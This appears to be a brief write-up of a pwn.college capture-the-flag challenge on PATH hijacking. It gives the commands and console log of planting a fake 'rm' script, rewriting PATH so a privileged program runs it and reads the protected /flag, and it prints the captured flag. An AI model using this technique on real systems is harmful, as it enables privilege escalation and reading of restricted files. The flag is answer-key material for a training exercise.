# CTF Challenge: hijacking_commands

## Table of Content

- commands-executed: chmod +x rm , ./rm , /challenge/run ,PATH="/home/hacker/rm:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:", echo $PATH
- flag :pwn.college{8_HBlRqCFQGtq6LPG4Opu2_PGyr.ddzNyUDLzETN0czW}


### Output:
```console
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ ./rm
cat: /flag: Permission denied
hacker@path~hijacking-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ PATH="/home/hacker/rm:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
./rm: line 1: cat: command not found
hacker@path~hijacking-commands:~$ /usr/bin/nano rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{8_HBlRqCFQGtq6LPG4Opu2_PGyr.ddzNyUDLzETN0czW}
```
